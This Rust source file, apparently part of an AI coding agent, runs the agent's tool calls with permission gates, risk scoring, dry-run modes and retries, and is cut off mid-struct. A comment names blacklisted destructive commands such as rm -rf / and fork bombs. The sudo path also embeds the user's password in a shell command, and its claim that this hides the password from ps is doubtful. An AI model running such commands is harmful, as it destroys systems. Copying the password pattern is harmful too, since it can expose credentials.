//! Parallel tool executor: partitions tools by permission level and executes
//! ReadOnly tools concurrently via `futures::join_all`, while Destructive/ReadWrite
//! tools requiring permission run sequentially.

use std::time::{Duration, Instant};

use futures::stream::StreamExt as _;

use chrono::Utc;

use halcon_core::types::{
    ContentBlock, DomainEvent, EventPayload, PermissionDecision, PermissionLevel, ToolInput,
};
use halcon_core::EventSender;
use halcon_storage::{AsyncDatabase, ToolExecutionMetric, TraceStep, TraceStepType};
use halcon_tools::ToolRegistry;

use halcon_core::types::ToolRetryConfig;

use super::accumulator::CompletedToolUse;
use super::conversational_permission::ConversationalPermissionHandler;
use super::adaptive_prompt::RiskLevel as AdaptiveRiskLevel;
use super::idempotency::DryRunMode;
use super::output_risk_scorer;
use crate::render::sink::RenderSink;
use crate::render::diff::{compute_ai_diff, render_file_diff};

/// Configuration for tool execution (dry-run + idempotency).
///
/// Introduced in Phase 16 to avoid cascading parameter changes.
/// Pass `&ToolExecutionConfig::default()` for normal execution.
pub struct ToolExecutionConfig<'a> {
    /// Dry-run mode controls which tools are actually executed.
    pub dry_run_mode: DryRunMode,
    /// Optional idempotency registry for deduplicating identical tool calls.
    /// Wired in Sub-Phase 16.1.
    pub idempotency: Option<&'a super::idempotency::IdempotencyRegistry>,
    /// Tool retry configuration for transient failures.
    pub retry: ToolRetryConfig,
}

impl Default for ToolExecutionConfig<'_> {
    fn default() -> Self {
        Self {
            dry_run_mode: DryRunMode::Off,
            idempotency: None,
            retry: ToolRetryConfig::default(),
        }
    }
}

/// Result of executing one tool.
pub struct ToolExecResult {
    pub tool_use_id: String,
    pub tool_name: String,
    pub content_block: ContentBlock,
    pub duration_ms: u64,
    pub was_parallel: bool,
}

/// Plan for executing a batch of tools.
pub struct ToolExecutionPlan {
    /// ReadOnly tools that can be executed concurrently.
    pub parallel_batch: Vec<CompletedToolUse>,
    /// Tools that require sequential execution (permission prompt or destructive).
    pub sequential_batch: Vec<CompletedToolUse>,
}

/// Partition completed tool uses into parallel and sequential batches.
pub fn plan_execution(
    tools: Vec<CompletedToolUse>,
    registry: &ToolRegistry,
) -> ToolExecutionPlan {
    let mut parallel = Vec::new();
    let mut sequential = Vec::new();

    for tool_call in tools {
        let can_parallel = if let Some(tool) = registry.get(&tool_call.name) {
            let level = tool.permission_level();
            // ReadOnly tools are always auto-allowed, safe to parallelize.
            // ReadWrite tools are auto-allowed too, but they mutate state — keep sequential.
            level == PermissionLevel::ReadOnly
        } else {
            // Unknown tools go sequential (will produce error anyway).
            false
        };

        if can_parallel {
            parallel.push(tool_call);
        } else {
            sequential.push(tool_call);
        }
    }

    ToolExecutionPlan {
        parallel_batch: parallel,
        sequential_batch: sequential,
    }
}

/// Build a synthetic dry-run result for a tool that was skipped.
fn synthetic_dry_run_result(tool_call: &CompletedToolUse) -> ToolExecResult {
    ToolExecResult {
        tool_use_id: tool_call.id.clone(),
        tool_name: tool_call.name.clone(),
        content_block: ContentBlock::ToolResult {
            tool_use_id: tool_call.id.clone(),
            content: format!("[dry-run] Tool '{}' skipped (would execute with: {})",
                tool_call.name,
                serde_json::to_string(&tool_call.input).unwrap_or_default(),
            ),
            is_error: false,
        },
        duration_ms: 0,
        was_parallel: false,
    }
}

/// Check if an error message indicates a transient failure that can be retried.
///
/// Transient errors are temporary conditions — a brief wait or a single retry may
/// succeed. The agent loop uses this to decide whether to suppress the
/// `EnvironmentError` halt path and allow one more round.
///
/// IMPORTANT: MCP *connection* failures (pool call failed, connection reset) are
/// classified as transient — the MCP server can recover within the same session.
/// MCP *initialization* failures (server not started, process fail) are deterministic.
fn is_transient_error(error: &str) -> bool {
    let lower = error.to_lowercase();
    lower.contains("timeout")
        || lower.contains("timed out")
        || lower.contains("rate limit")
        || lower.contains("rate_limit")
        || lower.contains("429")
        || lower.contains("connection reset")
        || lower.contains("connection refused")
        || lower.contains("broken pipe")
        || lower.contains("temporary")
        // MCP pool/transport errors: the MCP server process is alive but the
        // stdio/socket connection dropped transiently. Can recover in next round.
        || lower.contains("mcp pool call failed")
        || lower.contains("failed to call")
        || lower.contains("transport error")
        || lower.contains("channel closed")
}

/// Check if an error is deterministic (will never succeed on retry/replan).
///
/// These errors indicate permanent conditions: missing files, bad permissions,
/// invalid schemas, billing/auth failures, tool not registered, etc.
/// Retrying or replanning will produce the same result — abort rather than loop.
///
/// NOTE: MCP *connection* failures are NOT in this list (moved to is_transient_error).
/// Only MCP *initialization* failures (server not started, process crash) are here.
pub fn is_deterministic_error(error: &str) -> bool {
    let lower = error.to_lowercase();
    lower.contains("no such file or directory")
        || lower.contains("not found")
        || lower.contains("permission denied")
        || lower.contains("invalid path")
        || lower.contains("is a directory")
        || lower.contains("not a directory")
        || lower.contains("path traversal")
        || lower.contains("blocked by security")
        || lower.contains("unknown tool")
        || lower.contains("denied by task context")
        || lower.contains("schema")
        || lower.contains("missing required")
        // Auth/billing errors — retrying will never fix these.
        || lower.contains("credit balance")
        || lower.contains("invalid_api_key")
        || lower.contains("authentication")
        || lower.contains("unauthorized")
        || lower.contains("insufficient_quota")
        // MCP initialization errors — the server process failed to start or
        // the tool/engine was never initialized. Re-calling will never work.
        || lower.contains("mcp server is not initialized")
        || lower.contains("not initialized")
        || lower.contains("process start")
        || lower.contains("process failed")
}

/// Generate diff preview for file_edit operations.
///
/// Returns (path, added_lines, deleted_lines) if successful, None otherwise.
/// Writes the unified diff to stderr for user review before permission prompt.
fn generate_file_edit_preview(input: &serde_json::Value) -> Option<(String, usize, usize)> {
    use std::io::Write;

    let path = input.get("path")?.as_str()?;
    let old_string = input.get("old_string")?.as_str()?;
    let new_string = input.get("new_string")?.as_str()?;
    let replace_all = input.get("replace_all")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    // Read current file
    let old_content = match std::fs::read_to_string(path) {
        Ok(c) => c,
        Err(e) => {
            tracing::warn!("Failed to read file for diff preview: {}", e);
            eprintln!("\n⚠️  [file not readable - diff preview unavailable]\n");
            return None;
        }
    };

    // Binary detection
    if old_content.contains('\0') {
        eprintln!("\n⚠️  [binary file - diff preview unavailable]\n");
        return None;
    }

    // Apply replacement (same logic as file_edit tool)
    let new_content = if replace_all {
        old_content.replace(old_string, new_string)
    } else {
        old_content.replacen(old_string, new_string, 1)
    };

    // No changes
    if old_content == new_content {
        eprintln!("\n⚠️  [no changes detected - replacement string not found]\n");
        return None;
    }

    // Compute diff
    let diff = compute_ai_diff(path, &old_content, &new_content);

    // Extract stats
    let added = diff.added;
    let deleted = diff.deleted;

    // Render to stderr (render_file_diff writes directly)
    let mut preview = Vec::new();
    render_file_diff(&diff, &mut preview);

    // Write to stderr
    if let Err(e) = std::io::stderr().write_all(&preview) {
        tracing::warn!("Failed to write diff to stderr: {}", e);
        return None;
    }

    // Flush to ensure it appears before the permission prompt
    let _ = std::io::stderr().flush();

    Some((path.to_string(), added, deleted))
}

/// Apply ±20% jitter to a delay to prevent thundering herd.
fn jittered_delay(delay_ms: u64) -> u64 {
    use rand::Rng;
    let jitter_factor = 0.8 + rand::rng().random_range(0.0..0.4);
    (delay_ms as f64 * jitter_factor) as u64
}

// ─────────────────────────────────────────────────────────────────────────────
// execute_one_tool helpers — each <50 LOC, independently testable
// ─────────────────────────────────────────────────────────────────────────────

/// Build a ToolExecResult with is_error=true and zero duration.
#[inline]
fn make_error_result(tool_call: &CompletedToolUse, content: String) -> ToolExecResult {
    ToolExecResult {
        tool_use_id: tool_call.id.clone(),
        tool_name: tool_call.name.clone(),
        content_block: ContentBlock::ToolResult {
            tool_use_id: tool_call.id.clone(),
            content,
            is_error: true,
        },
        duration_ms: 0,
        was_parallel: false,
    }
}

/// Return an error result if the tool is not in the registry.
fn check_tool_known(
    tool_call: &CompletedToolUse,
    registry: &ToolRegistry,
) -> Result<std::sync::Arc<dyn halcon_core::traits::Tool>, ToolExecResult> {
    registry.get(&tool_call.name).cloned().ok_or_else(|| {
        make_error_result(tool_call, format!("Error: unknown tool '{}'", tool_call.name))
    })
}

/// Return a dry-run result if the mode demands it, otherwise None.
fn check_dry_run(
    tool_call: &CompletedToolUse,
    perm_level: PermissionLevel,
    dry_run_mode: DryRunMode,
) -> Option<ToolExecResult> {
    match dry_run_mode {
        DryRunMode::Off => None,
        DryRunMode::Full => Some(synthetic_dry_run_result(tool_call)),
        DryRunMode::DestructiveOnly if perm_level >= PermissionLevel::ReadWrite => {
            Some(synthetic_dry_run_result(tool_call))
        }
        DryRunMode::DestructiveOnly => None,
    }
}

/// Return a cached result if this call was already executed, plus the execution_id for recording.
fn check_idempotency(
    tool_call: &CompletedToolUse,
    idempotency: Option<&super::idempotency::IdempotencyRegistry>,
) -> (Option<ToolExecResult>, Option<String>) {
    let Some(reg) = idempotency else { return (None, None) };
    let id = super::idempotency::compute_execution_id(&tool_call.name, &tool_call.input, "");
    if let Some(cached) = reg.lookup(&id) {
        let result = ToolExecResult {
            tool_use_id: tool_call.id.clone(),
            tool_name: tool_call.name.clone(),
            content_block: ContentBlock::ToolResult {
                tool_use_id: tool_call.id.clone(),
                content: cached.result_content,
                is_error: cached.is_error,
            },
            duration_ms: 0,
            was_parallel: false,
        };
        return (Some(result), Some(id));
    }
    (None, Some(id))
}

/// Validate tool arguments: reject poisoned parse errors and high-risk args.
/// Returns Some(error_result) if the call must be blocked, None if safe to proceed.
fn validate_tool_args(tool_call: &CompletedToolUse) -> Option<ToolExecResult> {
    // RC-4: Reject malformed args from streaming parse failures.
    if let Some(parse_err) = tool_call.input.get("_parse_error") {
        let err_msg = parse_err.as_str().unwrap_or("unknown parse error");
        tracing::error!(
            tool = %tool_call.name,
            tool_use_id = %tool_call.id,
            parse_error = %err_msg,
            "Rejecting tool call with malformed arguments from streaming parse failure"
        );
        return Some(make_error_result(
            tool_call,
            format!(
                "Error: tool arguments were corrupted during streaming (parse error: {err_msg}). \
                 The model's tool call was truncated or malformed. Please retry."
            ),
        ));
    }
    // G3: Pre-execution risk scoring — block high-risk args before execution.
    let risk = output_risk_scorer::score_tool_args(&tool_call.name, &tool_call.input);
    if risk.is_high_risk() {
        tracing::warn!(
            tool = %tool_call.name,
            score = risk.score,
            flags = ?risk.flags,
            "Tool args blocked by pre-execution risk scorer (score >= 50)"
        );
        return Some(make_error_result(
            tool_call,
            format!(
                "[BLOCKED] High-risk tool arguments detected (score: {}/100). \
                 Flags: {:?}. The command was rejected by pre-execution risk scoring.",
                risk.score, risk.flags
            ),
        ));
    }
    None
}

/// Execute the tool with exponential-backoff retries for transient failures.
async fn run_with_retry(
    tool_call: &CompletedToolUse,
    tool: &std::sync::Arc<dyn halcon_core::traits::Tool>,
    working_dir: &str,
    tool_timeout: Duration,
    retry_config: &ToolRetryConfig,
    render_sink: &dyn RenderSink,
) -> ToolExecResult {
    let start = Instant::now();
    let max_attempts = retry_config.max_retries + 1;

    for attempt in 0..max_attempts {
        let tool_input = ToolInput {
            tool_use_id: tool_call.id.clone(),
            arguments: tool_call.input.clone(),
            working_directory: working_dir.to_string(),
        };

        match tokio::time::timeout(tool_timeout, tool.execute(tool_input)).await {
            Ok(Ok(output)) => {
                return ToolExecResult {
                    tool_use_id: tool_call.id.clone(),
                    tool_name: tool_call.name.clone(),
                    content_block: ContentBlock::ToolResult {
                        tool_use_id: tool_call.id.clone(),
                        content: output.content,
                        is_error: output.is_error,
                    },
                    duration_ms: start.elapsed().as_millis() as u64,
                    was_parallel: false,
                };
            }
            Ok(Err(e)) => {
                let err_str = format!("{e}");
                if attempt + 1 < max_attempts && is_transient_error(&err_str) {
                    let delay = jittered_delay(std::cmp::min(
                        retry_config.base_delay_ms * 2u64.pow(std::cmp::min(attempt, 5)),
                        retry_config.max_delay_ms,
                    ));
                    tracing::info!(tool = %tool_call.name, attempt = attempt + 1, delay_ms = delay, "Retrying transient tool error: {err_str}");
                    render_sink.tool_retrying(&tool_call.name, (attempt + 1) as usize, max_attempts as usize, delay);
                    tokio::time::sleep(Duration::from_millis(delay)).await;
                    continue;
                }
                return ToolExecResult {
                    tool_use_id: tool_call.id.clone(),
                    tool_name: tool_call.name.clone(),
                    content_block: ContentBlock::ToolResult {
                        tool_use_id: tool_call.id.clone(),
                        content: format!("Error: {e}"),
                        is_error: true,
                    },
                    duration_ms: start.elapsed().as_millis() as u64,
                    was_parallel: false,
                };
            }
            Err(_elapsed) => {
                let err_str = format!("Error: tool '{}' timed out after {}s", tool_call.name, tool_timeout.as_secs());
                if attempt + 1 < max_attempts {
                    let delay = std::cmp::min(
                        retry_config.base_delay_ms * 2u64.pow(std::cmp::min(attempt, 5)),
                        retry_config.max_delay_ms,
                    );
                    tracing::info!(tool = %tool_call.name, attempt = attempt + 1, delay_ms = delay, "Retrying timed out tool");
                    render_sink.tool_retrying(&tool_call.name, (attempt + 1) as usize, max_attempts as usize, delay);
                    tokio::time::sleep(Duration::from_millis(delay)).await;
                    continue;
                }
                return ToolExecResult {
                    tool_use_id: tool_call.id.clone(),
                    tool_name: tool_call.name.clone(),
                    content_block: ContentBlock::ToolResult {
                        tool_use_id: tool_call.id.clone(),
                        content: err_str,
                        is_error: true,
                    },
                    duration_ms: start.elapsed().as_millis() as u64,
                    was_parallel: false,
                };
            }
        }
    }
    unreachable!("loop always returns on final attempt")
}

/// Record the execution result in the idempotency registry.
fn record_idempotency(
    idempotency: Option<&super::idempotency::IdempotencyRegistry>,
    exec_id: Option<String>,
    tool_call: &CompletedToolUse,
    result: &ToolExecResult,
) {
    let (Some(registry), Some(id)) = (idempotency, exec_id) else { return };
    let (content, is_error) = match &result.content_block {
        ContentBlock::ToolResult { content, is_error, .. } => (content.clone(), *is_error),
        _ => (String::new(), false),
    };
    registry.record(super::idempotency::ExecutionRecord {
        execution_id: id,
        tool_name: tool_call.name.clone(),
        result_content: content,
        is_error,
        executed_at: chrono::Utc::now(),
    });
}

// ─────────────────────────────────────────────────────────────────────────────

/// Execute a single tool — orchestrates pre/post gates and delegates to helpers.
async fn execute_one_tool(
    tool_call: &CompletedToolUse,
    registry: &ToolRegistry,
    working_dir: &str,
    tool_timeout: Duration,
    dry_run_mode: DryRunMode,
    idempotency: Option<&super::idempotency::IdempotencyRegistry>,
    retry_config: &ToolRetryConfig,
    render_sink: &dyn RenderSink,
    plugin_registry: Option<&std::sync::Mutex<super::plugin_registry::PluginRegistry>>,
) -> ToolExecResult {
    // 1. Resolve tool from registry (fail fast on unknown tool).
    let tool = match check_tool_known(tool_call, registry) {
        Ok(t) => t,
        Err(e) => return e,
    };

    // 2. Plugin pre-invoke gate (fail-closed on lock contention).
    if let Some(pr_mutex) = plugin_registry {
        match pr_mutex.try_lock() {
            Ok(pr) => {
                if let Some(plugin_id) = pr.plugin_id_for_tool(&tool_call.name).map(str::to_owned) {
                    if let super::plugin_registry::InvokeGateResult::Deny(reason) =
                        pr.pre_invoke_gate(&plugin_id, &tool_call.name, false)
                    {
                        return synthetic_plugin_denied_result(tool_call, &reason);
                    }
                }
            }
            Err(_) => {
                tracing::warn!(tool = %tool_call.name, "plugin gate lock contention — denying tool (fail-closed)");
                return synthetic_plugin_denied_result(tool_call, "plugin service temporarily unavailable");
            }
        }
    }

    // 3. Dry-run shortcut.
    if let Some(r) = check_dry_run(tool_call, tool.permission_level(), dry_run_mode) {
        return r;
    }

    // 4. Idempotency cache lookup.
    let (cached, exec_id) = check_idempotency(tool_call, idempotency);
    if let Some(r) = cached { return r; }

    // 5. Argument validation (parse errors + risk scoring).
    if let Some(r) = validate_tool_args(tool_call) { return r; }

    // 6. Execute with exponential-backoff retry.
    let exec_result = run_with_retry(tool_call, &tool, working_dir, tool_timeout, retry_config, render_sink).await;

    // 7. Record in idempotency registry.
    record_idempotency(idempotency, exec_id, tool_call, &exec_result);

    // 8. Plugin post-invoke (best-effort, lock contention just skips metrics).
    if let Some(pr_mutex) = plugin_registry {
        match pr_mutex.try_lock() {
            Ok(mut pr) => {
                if let Some(plugin_id) = pr.plugin_id_for_tool(&tool_call.name).map(str::to_owned) {
                    let is_err = matches!(&exec_result.content_block, ContentBlock::ToolResult { is_error: true, .. });
                    pr.post_invoke(&plugin_id, &tool_call.name, 0, 0.0, !is_err, None);
                }
            }
            Err(_) => tracing::warn!(tool = %tool_call.name, "plugin post-invoke metrics skipped — lock contention"),
        }
    }

    exec_result
}

/// Build a synthetic ToolExecResult for plugin gate denials.
///
/// Returns an `is_error: true` tool result so the agent loop treats the
/// plugin denial identically to a normal tool failure — the halting
/// logic (ToolFailureTracker, circuit breaker, etc.) receives a clean signal.
fn synthetic_plugin_denied_result(tool_call: &CompletedToolUse, reason: &str) -> ToolExecResult {
    ToolExecResult {
        tool_use_id: tool_call.id.clone(),
        tool_name: tool_call.name.clone(),
        content_block: ContentBlock::ToolResult {
            tool_use_id: tool_call.id.clone(),
            content: format!("Plugin gate denied: {reason}"),
            is_error: true,
        },
        duration_ms: 0,
        was_parallel: false,
    }
}

/// Execute the parallel batch concurrently with a concurrency cap.
///
/// Uses `buffer_unordered` to limit the number of concurrent tool executions.
#[allow(clippy::too_many_arguments)]
pub async fn execute_parallel_batch(
    batch: &[CompletedToolUse],
    registry: &ToolRegistry,
    working_dir: &str,
    tool_timeout: Duration,
    event_tx: &EventSender,
    trace_db: Option<&AsyncDatabase>,
    session_id: uuid::Uuid,
    trace_step_index: &mut u32,
    max_parallel_tools: usize,
    exec_config: &ToolExecutionConfig<'_>,
    render_sink: &dyn RenderSink,
    plugin_registry: Option<&std::sync::Mutex<super::plugin_registry::PluginRegistry>>,
) -> Vec<ToolExecResult> {
    if batch.is_empty() {
        return Vec::new();
    }

    tracing::info!(count = batch.len(), "Executing parallel tool batch");

    // Record parallel batch trace step.
    if let Some(db) = trace_db {
        let tool_ids: Vec<&str> = batch.iter().map(|t| t.id.as_str()).collect();
        let step = TraceStep {
            session_id,
            step_index: *trace_step_index,
            step_type: TraceStepType::ToolCall,
            data_json: serde_json::json!({
                "parallel_batch": true,
                "tool_count": batch.len(),
                "tool_ids": tool_ids,
                "tool_names": batch.iter().map(|t| t.name.as_str()).collect::<Vec<_>>(),
            })
            .to_string(),
            duration_ms: 0,
            timestamp: Utc::now(),
        };
        if let Err(e) = db.inner().append_trace_step(&step) {
            tracing::warn!("trace recording failed (step {}): {e}", *trace_step_index);
        }
        *trace_step_index += 1;
    }

    // Launch all tools concurrently.
    let dry_run_mode = exec_config.dry_run_mode;
    let futures: Vec<_> = batch
        .iter()
        .map(|tool_call| {
            let name = tool_call.name.clone();
            let input = tool_call.input.clone();
            render_sink.tool_start(&name, &input);
            execute_one_tool(tool_call, registry, working_dir, tool_timeout, dry_run_mode, exec_config.idempotency, &exec_config.retry, render_sink, plugin_registry)
        })
        .collect();

    let max_concurrent = max_parallel_tools.max(1);
    let mut results: Vec<ToolExecResult> = futures::stream::iter(futures)
        .buffer_unordered(max_concurrent)
        .collect()
        .await;

    // Mark all as parallel and emit events.
    for result in &mut results {
        result.was_parallel = true;

        let perm_level = registry
            .get(&result.tool_name)
            .map(|t| t.permission_level())
            .unwrap_or(PermissionLevel::ReadOnly);

        let is_error = matches!(&result.content_block,
            ContentBlock::ToolResult { is_error, .. } if *is_error);

        let _ = event_tx.send(DomainEvent::new(EventPayload::ToolExecuted {
            tool: result.tool_name.clone(),
            permission: perm_level,
            duration_ms: result.duration_ms,
            success: !is_error,
        }));

        // Individual trace step per tool result.
        if let Some(db) = trace_db {
            let content = match &result.content_block {
                ContentBlock::ToolResult { content, .. } => content.as_str(),
                _ => "",
            };
            let step = TraceStep {
                session_id,
                step_index: *trace_step_index,
                step_type: TraceStepType::ToolResult,
                data_json: serde_json::json!({
                    "tool_use_id": &result.tool_use_id,
                    "tool_name": &result.tool_name,
                    "content": content,
                    "is_error": is_error,
                    "duration_ms": result.duration_ms,
                    "parallel": true,
                })
                .to_string(),
                duration_ms: result.duration_ms,
                timestamp: Utc::now(),
            };
            if let Err(e) = db.inner().append_trace_step(&step) {
                tracing::warn!("trace recording failed (step {}): {e}", *trace_step_index);
            }
            *trace_step_index += 1;
        }
    }

    // Persist tool execution metrics to M11 (tool_execution_metrics table).
    // Uses batch insert for efficiency — single transaction for the whole parallel batch.
    // Non-fatal: metric recording failures never propagate to the caller.
    if let Some(db) = trace_db {
        let metrics: Vec<ToolExecutionMetric> = results
            .iter()
            .map(|r| {
                let is_error = matches!(
                    &r.content_block,
                    ContentBlock::ToolResult { is_error, .. } if *is_error
                );
                ToolExecutionMetric {
                    tool_name: r.tool_name.clone(),
                    session_id: Some(session_id.to_string()),
                    duration_ms: r.duration_ms,
                    success: !is_error,
                    is_parallel: true,
                    input_summary: None,
                    created_at: Utc::now(),
                }
            })
            .collect();
        if !metrics.is_empty() {
            if let Err(e) = db.inner().batch_insert_tool_metrics(&metrics) {
                tracing::warn!("tool_execution_metrics batch insert failed: {e}");
            }
        }
    }

    // Sort by tool_use_id for deterministic ordering.
    results.sort_by(|a, b| a.tool_use_id.cmp(&b.tool_use_id));
    results
}

/// Execute a single tool sequentially (with permission check).
#[allow(clippy::too_many_arguments)]
pub async fn execute_sequential_tool(
    tool_call: &CompletedToolUse,
    registry: &ToolRegistry,
    permissions: &mut ConversationalPermissionHandler,
    working_dir: &str,
    tool_timeout: Duration,
    event_tx: &EventSender,
    trace_db: Option<&AsyncDatabase>,
    session_id: uuid::Uuid,
    trace_step_index: &mut u32,
    exec_config: &ToolExecutionConfig<'_>,
    render_sink: &dyn RenderSink,
    plugin_registry: Option<&std::sync::Mutex<super::plugin_registry::PluginRegistry>>,
) -> ToolExecResult {
    let Some(tool) = registry.get(&tool_call.name) else {
        return ToolExecResult {
            tool_use_id: tool_call.id.clone(),
            tool_name: tool_call.name.clone(),
            content_block: ContentBlock::ToolResult {
                tool_use_id: tool_call.id.clone(),
                content: format!("Error: unknown tool '{}'", tool_call.name),
                is_error: true,
            },
            duration_ms: 0,
            was_parallel: false,
        };
    };

    let perm_level = tool.permission_level();

    // Dry-run bypass: skip permission flow for tools that would be dry-run skipped.
    match exec_config.dry_run_mode {
        DryRunMode::Off => { /* Normal execution, fall through. */ }
        DryRunMode::Full => {
            return synthetic_dry_run_result(tool_call);
        }
        DryRunMode::DestructiveOnly => {
            if perm_level >= PermissionLevel::ReadWrite {
                return synthetic_dry_run_result(tool_call);
            }
        }
    }

    let mut tool_input = ToolInput {
        tool_use_id: tool_call.id.clone(),
        arguments: tool_call.input.clone(),
        working_directory: working_dir.to_string(),
    };

    // TBAC check (before legacy permission check).
    {
        use halcon_core::types::AuthzDecision;
        match permissions.check_tbac(&tool_call.name, &tool_call.input) {
            AuthzDecision::Allowed { .. } => {
                // TBAC allowed — continue to legacy permission check.
            }
            AuthzDecision::NoContext => {
                // No TBAC context — fall through to legacy.
            }
            AuthzDecision::ToolNotAllowed { ref tool, .. }
            | AuthzDecision::ParamViolation { ref tool, .. } => {
                tracing::info!(tool = %tool, "TBAC denied");
                return ToolExecResult {
                    tool_use_id: tool_call.id.clone(),
                    tool_name: tool_call.name.clone(),
                    content_block: ContentBlock::ToolResult {
                        tool_use_id: tool_call.id.clone(),
                        content: format!(
                            "Error: tool '{}' denied by task context policy",
                            tool_call.name
                        ),
                        is_error: true,
                    },
                    duration_ms: 0,
                    was_parallel: false,
                };
            }
            AuthzDecision::ContextInvalid { reason, .. } => {
                tracing::info!(tool = %tool_call.name, reason = %reason, "TBAC context invalid");
                return ToolExecResult {
                    tool_use_id: tool_call.id.clone(),
                    tool_name: tool_call.name.clone(),
                    content_block: ContentBlock::ToolResult {
                        tool_use_id: tool_call.id.clone(),
                        content: format!(
                            "Error: task context expired or exhausted for tool '{}'",
                            tool_call.name
                        ),
                        is_error: true,
                    },
                    duration_ms: 0,
                    was_parallel: false,
                };
            }
        }
    }

    // Emit permission event for destructive tools.
    if perm_level >= PermissionLevel::Destructive {
        let _ = event_tx.send(DomainEvent::new(EventPayload::PermissionRequested {
            tool: tool_call.name.clone(),
            level: perm_level,
        }));
    }

    // Emit permission-awaiting event for destructive tools.
    if perm_level == halcon_core::types::PermissionLevel::Destructive {
        // ========================================================================
        // CRITICAL INTEGRATION POINT: Blacklist-Aware Risk Assessment
        // ========================================================================
        //
        // Phase 7: Use ConversationalPermissionHandler to assess risk level.
        // This is CRITICAL because it includes command blacklist checking:
        //
        // - Normal destructive commands → High risk (e.g., rm -rf /tmp/test)
        // - Blacklisted commands → Critical risk (e.g., rm -rf /, dd disk wipe, fork bombs)
        //
        // The handler checks 12 dangerous patterns in command_blacklist.rs and
        // escalates to Critical if matched. This ensures users see proper warnings
        // for system-destroying commands.
        //
        // DO NOT hardcode risk_level here - it bypasses blacklist protection!
        //
        // FIX HISTORY: Previously hardcoded as "High" (CRITICAL BUG #1).
        // Fixed: 2026-02-15, now calls assess_risk_level() dynamically.
        // ========================================================================

        let handler = ConversationalPermissionHandler::new(true);
        let risk = handler.assess_risk_level(&tool_call.name, perm_level, &tool_call.input);

        let risk_level = match risk {
            AdaptiveRiskLevel::Low => "Low",
            AdaptiveRiskLevel::Medium => "Medium",
            AdaptiveRiskLevel::High => "High",
            AdaptiveRiskLevel::Critical => "Critical",
        };

        render_sink.permission_awaiting(&tool_call.name, &tool_call.input, risk_level);
        // Phase E5: Transition to ToolWait while awaiting permission.
        render_sink.agent_state_transition("executing", "tool_wait", "awaiting permission");

        // UX-9: Show diff preview for file_edit BEFORE permission prompt
        if tool_call.name == "file_edit" {
            let _ = generate_file_edit_preview(&tool_call.input);
            // Note: Stats from preview could enhance the permission prompt,
            // but that would require modifying AuthorizationMiddleware API.
            // For now, the visual diff is enough for informed decisions.
        }
    }

    // Phase I-6B: Conversational permission handler with multi-turn loop
    let decision = permissions
        .authorize(&tool_call.name, perm_level, &tool_input)
        .await;

    // Phase E5: Transition back from ToolWait after permission decision.
    if perm_level == halcon_core::types::PermissionLevel::Destructive {
        render_sink.agent_state_transition("tool_wait", "executing", "permission decided");
    }

    if decision == PermissionDecision::Denied {
        let _ = event_tx.send(DomainEvent::new(EventPayload::PermissionDenied {
            tool: tool_call.name.clone(),
            level: perm_level,
        }));
        render_sink.tool_denied(&tool_call.name);
        return ToolExecResult {
            tool_use_id: tool_call.id.clone(),
            tool_name: tool_call.name.clone(),
            content_block: ContentBlock::ToolResult {
                tool_use_id: tool_call.id.clone(),
                // Explicit "do not retry" signal: the model must NOT call this tool again.
                // A generic "permission denied" message is ambiguous — the model may interpret
                // it as a transient error and retry. The explicit instruction prevents retry loops.
                content: format!(
                    "Error: the user explicitly denied permission for '{}'. \
                     Do NOT retry this tool. Acknowledge the denial to the user \
                     and adjust your plan accordingly.",
                    tool_call.name
                ),
                is_error: true,
            },
            duration_ms: 0,
            was_parallel: false,
        };
    }

    if perm_level >= PermissionLevel::Destructive {
        let _ = event_tx.send(DomainEvent::new(EventPayload::PermissionGranted {
            tool: tool_call.name.clone(),
            level: perm_level,
        }));
    }

    // --- Sudo Password Injection (TUI mode only) ---
    // When a bash command starts with `sudo`, the TUI has captured the PTY and
    // sudo cannot prompt for a password interactively. We intercept the command,
    // open the SudoPasswordEntry modal, collect the password, then rewrite the
    // command to pipe it via `printf … | sudo -S`.
    #[cfg(feature = "tui")]
    {
        let is_sudo_bash = tool_call.name == "bash" && {
            tool_call.input
                .get("command")
                .and_then(|v| v.as_str())
                .map(|cmd| {
                    let t = cmd.trim();
                    t.starts_with("sudo ") || t == "sudo"
                })
                .unwrap_or(false)
        };

        if is_sudo_bash {
            let cmd_str = tool_call.input
                .get("command")
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_string();

            // Check if we have a cached password on the permissions checker.
            let has_cached = permissions.has_cached_sudo_password();

            // Signal TUI to open the sudo password modal.
            render_sink.sudo_password_request(&tool_call.name, &cmd_str, has_cached);
            tracing::debug!(command = %cmd_str, "Sudo password requested from TUI modal");

            // Await the password (30 second timeout — aligns with PermissionChecker timeout).
            if let Some(pw) = permissions.get_sudo_password(30).await {
                // Rewrite command: printf '%s\n' 'PASSWORD' | sudo -S COMMAND_WITHOUT_SUDO
                // Using printf (shell builtin) avoids the password appearing in `ps`.
                let cmd_without_sudo = cmd_str.trim()
                    .strip_prefix("sudo ")
                    .unwrap_or(cmd_str.trim());
                // Escape single quotes in password for safe shell embedding.
                let pw_escaped = pw.replace('\'', "'\\''");
                let new_cmd = format!(
                    "printf '%s\\n' '{}' | sudo -S -- {}",
                    pw_escaped, cmd_without_sudo
                );
                tool_input.arguments["command"] = serde_json::json!(new_cmd);
                tracing::debug!("Sudo command rewritten for password injection (password hidden)");
            } else {
                // No password obtained (cancelled / timed out) — execute as-is.
                // sudo will fail with "no password supplied" which is expected behavior.
                tracing::info!("Sudo password not provided (cancelled or timed out) — executing without injection");
            }
        }
    }

    // Trace: record tool call.
    if let Some(db) = trace_db {
        let step = TraceStep {
            session_id,
            step_index: *trace_step_index,
            step_type: TraceStepType::ToolCall,
            data_json: serde_json::json!({
                "tool_use_id": &tool_call.id,
                "tool_name": &tool_call.name,
                "input": &tool_call.input,
            })
            .to_string(),
            duration_ms: 0,
            timestamp: Utc::now(),
        };
        if let Err(e) = db.inner().append_trace_step(&step) {
            tracing::warn!("trace recording failed (step {}): {e}", *trace_step_index);
        }
        *trace_step_index += 1;
    }

    render_sink.tool_start(&tool_call.name, &tool_call.input);

    let result = execute_one_tool(tool_call, registry, working_dir, tool_timeout, exec_config.dry_run_mode, exec_config.idempotency, &exec_config.retry, render_sink, plugin_registry).await;
    let is_error = matches!(&result.content_block,
        ContentBlock::ToolResult { is_error, .. } if *is_error);

    // Persist tool execution metric to M11 (tool_execution_metrics table).
    // Non-fatal: failure here never propagates to the caller.
    if let Some(db) = trace_db {
        let tool_metric = ToolExecutionMetric {
            tool_name: result.tool_name.clone(),
            session_id: Some(session_id.to_string()),
            duration_ms: result.duration_ms,
            success: !is_error,
